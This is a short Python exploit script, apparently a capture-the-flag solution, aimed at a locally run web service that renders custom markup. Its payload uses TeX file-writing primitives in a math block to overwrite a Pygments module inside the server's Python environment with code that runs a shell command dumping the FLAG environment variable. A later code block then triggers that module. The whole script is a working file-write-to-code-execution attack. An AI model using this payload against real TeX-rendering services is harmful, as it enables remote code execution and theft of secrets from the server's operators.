import requests

# docker build . -t rubbery && docker run --rm -p 8000:8000 rubbery
BASE_URL = "http://127.0.0.1:8000"

r1 = requests.post(BASE_URL + "/render", data={
    "mydown_text": r'''
/math
$$
\newwrite\outfile
\openout\outfile=/srv/.venv/lib/python3.12/site-packages/pygments/cmdline.py
\write\outfile{import os; main = lambda: os.system("echo $FLAG > output.html")}
\closeout\outfile
$$
math/

/code:python

code/
'''
})

print(r1.text.splitlines()[-1])
